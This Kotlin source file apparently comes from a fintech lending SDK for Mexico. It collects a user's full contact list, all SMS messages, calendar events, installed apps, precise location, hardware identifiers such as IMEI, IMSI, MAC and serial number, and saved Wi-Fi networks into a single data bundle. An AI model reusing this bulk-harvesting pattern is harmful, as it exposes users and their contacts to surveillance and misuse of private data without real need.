package com.fintek.utils_mexico

import android.Manifest
import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.os.Build
import android.os.SystemClock
import android.text.format.Formatter
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import androidx.core.content.edit
import com.fintek.utils_androidx.FintekUtils
import com.fintek.utils_androidx.packageInfo.PackageUtils
import com.fintek.utils_androidx.app.AppUtils
import com.fintek.utils_androidx.battery.BatteryUtils
import com.fintek.utils_androidx.calendar.CalendarEventUtils
import com.fintek.utils_androidx.calendar.CalendarUtils
import com.fintek.utils_androidx.contact.ContactUtils
import com.fintek.utils_androidx.device.DeviceUtils
import com.fintek.utils_androidx.hardware.HardwareUtils
import com.fintek.utils_androidx.language.LanguageUtils
import com.fintek.utils_androidx.location.LocationUtils
import com.fintek.utils_androidx.network.NetworkUtils
import com.fintek.utils_androidx.phone.PhoneUtils
import com.fintek.utils_androidx.sms.SmsUtils
import com.fintek.utils_androidx.storage.RuntimeMemoryUtils
import com.fintek.utils_androidx.storage.StorageUtils
import com.fintek.utils_androidx.thread.ThreadUtils
import com.fintek.utils_mexico.battery.BatteryMexicoUtils
import com.fintek.utils_mexico.date.DateMexicoUtils
import com.fintek.utils_mexico.device.DeviceMexicoUtils
import com.fintek.utils_mexico.device.SensorMexicoUtils
import com.fintek.utils_mexico.ext.catchOrEmpty
import com.fintek.utils_mexico.ext.catchOrLong
import com.fintek.utils_mexico.ext.catchOrZero
import com.fintek.utils_mexico.ext.safely
import com.fintek.utils_mexico.hardware.HardwareMexicoUtils
import com.fintek.utils_mexico.language.LanguageMexicoUtils
import com.fintek.utils_mexico.location.LocationMexicoUtils
import com.fintek.utils_mexico.mac.MacMexicoUtils
import com.fintek.utils_mexico.model.*
import com.fintek.utils_mexico.network.NetworkMexicoUtils
import com.fintek.utils_mexico.query.*
import com.fintek.utils_mexico.structHandler.SmsMexicoStructHandler
import com.fintek.utils_mexico.storage.SDCardMexicoUtils
import com.fintek.utils_mexico.storage.StorageMexicoUtils
import com.fintek.utils_mexico.structHandler.AppMexicoStructHandler
import com.fintek.utils_mexico.structHandler.CalendarMexicoStructHandler
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.time.Instant

/**
 * Created by ChaoShen on 2021/4/12
 * Init Fintek mexico utils
 */
object FintekMexicoUtils {
    private var application: Application? = null
    private var gaid: String = ""
    private var uuid: String = ""
    private val locationUtils by lazy { LocationUtils() }
    private val sp by lazy { requiredApplication.getSharedPreferences("FintekMexicoUtils", Context.MODE_PRIVATE) }

    internal val requiredApplication: Application get() = requireNotNull(application) {
        "FintekMexicoUtils must init first, please use FintekMexicoUtils.init(Application application)"
    }

    @JvmStatic
    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.ACCESS_WIFI_STATE])
    fun init(application: Application) = apply {
        this.application = application
        FintekUtils.init(application)
        val sp = requiredApplication.getSharedPreferences("fintek_mexico", Context.MODE_PRIVATE)
        val spGaid = sp.getString("gaid", "").orEmpty()
        if (spGaid.isNotEmpty()) {
            gaid = spGaid
        }

        DeviceUtils.getGaid(object : FintekUtils.Consumer<String> {
            override fun accept(t: String) {
                gaid = t
                if (t != spGaid) {
                    sp.edit().putString("gaid", t).apply()
                }
            }
        })
    }

    @JvmStatic
    fun putLastLoginTime(millisecond: Long) {
        sp.edit {
            putLong("LAST_LOGIN_TIME", millisecond)
        }
    }

    @JvmStatic
    suspend fun getLastLoginTime(): Long = withContext(Dispatchers.Main) {
        val nowTime = System.currentTimeMillis()
        val realLoginTime = sp.getLong("LAST_LOGIN_TIME", nowTime)
        if (realLoginTime == nowTime) {
            putLastLoginTime(realLoginTime)
        }
        realLoginTime
    }

    @JvmStatic
    fun setUuid(uuid: String) {
        this.uuid = uuid
    }

    @JvmStatic
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    ])
    fun registerLocationListener() {
        safely { locationUtils.registerLocationListener() }
    }

    @JvmStatic
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    ])
    fun unregisterLocationListener() {
        safely { locationUtils.unregisterLocationListener() }
    }

    fun fetchLocationData() = locationUtils.getLocationData()

    @RequiresApi(Build.VERSION_CODES.KITKAT)
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALENDAR,
        Manifest.permission.READ_SMS
    ])
    suspend fun getExtension() = ExtensionModel(
        device = getDeviceInfo(),
        contacts = getContacts(),
        apps = getApps(),
        sms = getSms(),
        calendars = getCalendar(),
    )

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.ACCESS_NETWORK_STATE
    ])
    suspend fun getDeviceInfo(): DeviceInfo {
        val data = locationUtils.getLocationData()
        return DeviceInfo(
            albs = "",
            audioExternal = AudioQueryUtils.getExternalAudioCount(),
            audioInternal = AudioQueryUtils.getInternalAudioCount(),
            batteryStatus = getBatteryStatus(),
            generalData = getGeneralData(),
            hardware = getHardware(),
            network = getNetwork(),
            otherData = getOtherData(),
            newStorage = getStorage(),
            buildId = AppUtils.getAppVersionCode().toString(),
            buildName = AppUtils.getAppVersionName(),
            contactGroup = ContactQueryUtils.getContactGroupCount(),
            createTime = DateMexicoUtils.getCurrentDateTime(),
            downloadFiles = DownloadQueryUtils.getDownloadFileCount(),
            imagesExternal = ImageQueryUtils.getExternalImageCount(),
            imagesInternal = ImageQueryUtils.getInternalImageCount(),
            packageName = requiredApplication.packageName,
            videoExternal = VideoQueryUtils.getExternalVideoCount(),
            videoInternal = VideoQueryUtils.getInternalVideoCount(),
            gpsAdid = gaid,
            deviceId = DeviceMexicoUtils.getAndroidId(),
            deviceInfo = HardwareUtils.getModel(),
            osType = "android",
            osVersion = DeviceMexicoUtils.getDeviceOsVersion(),
            ip = NetworkMexicoUtils.getIp(),
            memory = catchOrEmpty("-1") { Formatter.formatFileSize(requiredApplication, RuntimeMemoryUtils.getTotalMemory()) },
            storage = StorageMexicoUtils.getExternalTotalSize(),
            unUseStorage = StorageMexicoUtils.getExternalUnusedSize(),
            gpsLatitude = data?.location?.latitude?.toString().orEmpty(),
            gpsLongitude = data?.location?.longitude?.toString().orEmpty(),
            gpsAddress = LocationMexicoUtils.getAddress(data?.location).orEmpty(),
            addressInfo = LocationMexicoUtils.getAddressDetail(data?.location).orEmpty(),
            isWifi = NetworkMexicoUtils.isWifiEnable(),
            wifiName = NetworkMexicoUtils.getCurrentWifi().name,
            battery = BatteryUtils.getPercent(),
            isRoot = DeviceMexicoUtils.isRoot(),
            isSimulator = DeviceMexicoUtils.isSimulator(),
            lastLoginTime = getLastLoginTime() / 1000,
            picCount = ImageQueryUtils.getExternalImageCount() + ImageQueryUtils.getInternalImageCount(),
            imsi = DeviceMexicoUtils.getImsi(),
            mac = MacMexicoUtils.getMacAddress(),
            sdCard = SDCardMexicoUtils.getSDCardTotalSize(),
            unUseSdCard = SDCardMexicoUtils.getSDCardAvailableSize(),
            idfa = "",
            idfv = "",
            ime = DeviceUtils.getImei().orEmpty(),
            resolution = "${HardwareUtils.getPhysicalWidth()}x${HardwareUtils.getPhysicalHeight()}",
            brand = HardwareUtils.getBrand(),
        )
    }

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    @RequiresPermission(Manifest.permission.READ_CONTACTS)
    fun getContacts(): List<Contact>? {
        return try {
            val contacts = ContactUtils.getContacts()
            val transformList = mutableListOf<Contact>()
            contacts.asSequence().forEach {
                when(it.phone?.size) {
                    0 -> transformList.add(
                        Contact(
                            name = it.name.orEmpty(),
                            phoneNumber = "",
                            updateTime = it.upTime?.toLong() ?: 0L,
                            lastTimeContacted = it.lastTimeContacted.toLong(),
                            timesContacted = it.timesContacted
                        )
                    )
                    1 -> transformList.add(
                        Contact(
                            name = it.name.orEmpty(),
                            phoneNumber = it.phone?.get(0).orEmpty(),
                            updateTime = it.upTime?.toLong() ?: 0L,
                            lastTimeContacted = it.lastTimeContacted.toLong(),
                            timesContacted = it.timesContacted
                        )
                    )
                    else -> transformList.addAll(
                        it.phone?.map { internalPhone ->
                            Contact(
                                name = it.name.orEmpty(),
                                phoneNumber = internalPhone,
                                updateTime = it.upTime?.toLong() ?: 0L,
                                lastTimeContacted = it.lastTimeContacted.toLong(),
                                timesContacted = it.timesContacted
                            )
                        } ?: emptyList()
                    )
                }
            }
            transformList
        } catch (e: Exception) {
            null
        } catch (e: Throwable) {
            null
        }
    }

    @JvmStatic
    fun getApps(): List<App>? = safely {
        PackageUtils.getAllPackage(AppMexicoStructHandler())
    }

    @JvmStatic
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    @RequiresPermission(anyOf = [Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS])
    fun getSms(): List<Sms>? = try {
        SmsUtils.getAllSms(projection = SmsMexicoStructHandler())
    } catch (e: Exception) {
        null
    } catch (e: Throwable) {
        null
    }

    @JvmStatic
    @RequiresPermission(Manifest.permission.READ_CALENDAR)
    fun getCalendar(): List<Calendar>? = try {
        CalendarEventUtils.getCalendar(CalendarMexicoStructHandler())
    } catch (e: Exception) {
        null
    } catch (e: Throwable) {
        null
    }

    private fun getBatteryStatus() = BatteryStatus(
        batteryLevel = BatteryMexicoUtils.getBatteryRemainder(),
        batteryMax = BatteryMexicoUtils.getBatteryCapacity(),
        batteryPercent = BatteryMexicoUtils.getPercent(),
        isAcCharge = BatteryMexicoUtils.isAcCharging(),
        isCharging = BatteryMexicoUtils.isCharging(),
        isUsbCharge = BatteryMexicoUtils.isUsbCharging()
    )

    @SuppressLint("MissingPermission", "NewApi")
    private fun getGeneralData() = GeneralData(
        androidId = DeviceMexicoUtils.getAndroidId(),
        currentSystemTime = System.currentTimeMillis(),
        elapsedRealtime = SystemClock.elapsedRealtime(),
        gaid = gaid,
        imei = DeviceUtils.getImei().orEmpty(),
        isUsbDebug = DeviceMexicoUtils.isEnableAdb(),
        isUsingProxyPort = NetworkMexicoUtils.isWifiProxy(),
        isUsingVpn = NetworkMexicoUtils.isEnableVpn(),
        language = LanguageMexicoUtils.getLanguage(),
        localeDisplayLanguage = LanguageUtils.getDisplayLanguage(),
        localeISO3Country = LanguageUtils.getIso3Country(),
        localeISO3Language = LanguageUtils.getIso3Language(),
        mac = MacMexicoUtils.getMacAddress(),
        networkOperatorName = NetworkUtils.getNetworkOperatorName(),
        networkType = NetworkMexicoUtils.getNetworkType(),
        networkTypeNew = NetworkMexicoUtils.getNetworkType(),
        phoneNumber = PhoneUtils.getPhoneNumber(),
        phoneType = catchOrZero { PhoneUtils.getPhoneType() },
        sensor = SensorMexicoUtils.getSensors(),
        timeZoneId = PhoneUtils.getTimeZoneDisplayName(),
        uptimeMillis = SystemClock.uptimeMillis(),
        uuid = uuid
    )

    private fun getHardware() = Hardware(
        board = HardwareUtils.getBoard(),
        brand = HardwareUtils.getBrand(),
        cores = ThreadUtils.getCpuCount(),
        deviceHeight = HardwareUtils.getPhysicalHeight(),
        deviceName = catchOrEmpty { DeviceUtils.getDeviceName() },
        deviceWidth = HardwareUtils.getPhysicalWidth(),
        model = HardwareUtils.getModel(),
        physicalSize = HardwareMexicoUtils.getScreenPhysicalInch(),
        productionDate = Build.TIME,
        release = HardwareUtils.getRelease(),
        sdkVersion = HardwareUtils.getSDKVersion().toString(),
        serialNumber = HardwareMexicoUtils.getSerialNumber()
    )

    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CHANGE_WIFI_STATE
    ])
    private suspend fun getNetwork(): Network {
        val configuredWifi = NetworkMexicoUtils.getConfiguredWifi()
        return Network(
            ip = NetworkUtils.getIpAddressByWifi(),
            configuredWifi = configuredWifi,
            currentWifi = NetworkMexicoUtils.getCurrentWifi(),
            wifiCount = configuredWifi.count() + 1
        )
    }

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private suspend fun getOtherData() = OtherData(
        dbm = DeviceMexicoUtils.getMobileDbm().toString(),
        keyboard = DeviceMexicoUtils.getCurrentKeyboardType(),
        lastBootTime = withContext(Dispatchers.Main) { System.currentTimeMillis() - SystemClock.elapsedRealtimeNanos() / 1000000L },
        isRoot = DeviceMexicoUtils.isRoot(),
        isSimulator = DeviceMexicoUtils.isSimulator()
    )

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    private fun getStorage() = Storage(
        appFreeMemory = catchOrEmpty { RuntimeMemoryUtils.getAppFreeMemory().toString() },
        appMaxMemory = catchOrEmpty { RuntimeMemoryUtils.getAppMaxMemory().toString() },
        appTotalMemory = catchOrEmpty { RuntimeMemoryUtils.getAppTotalMemory().toString() },
        containSd = SDCardMexicoUtils.isContainSDCard(),
        extraSd = SDCardMexicoUtils.isExtraSDCard(),
        internalStorageTotal = catchOrLong { StorageUtils.internalTotalStorageSize() },
        internalStorageUsable = catchOrLong { StorageUtils.internalAvailableStorageSize() },
        memoryCardSize = catchOrLong(-1) { SDCardMexicoUtils.getTotalSize() },
        memoryCardFreeSize = catchOrLong(-1) { SDCardMexicoUtils.getSDCardFreeSize() },
        memoryCardUsedSize = catchOrLong(-1) { SDCardMexicoUtils.getUsedSize() },
        memoryCardUsableSize = catchOrLong(-1) { SDCardMexicoUtils.getAvailableSize() },
        ramTotalSize = catchOrEmpty { RuntimeMemoryUtils.getTotalMemory().toString() },
        ramUsableSize = catchOrEmpty { RuntimeMemoryUtils.getAvailableMemory().toString() }
    )
}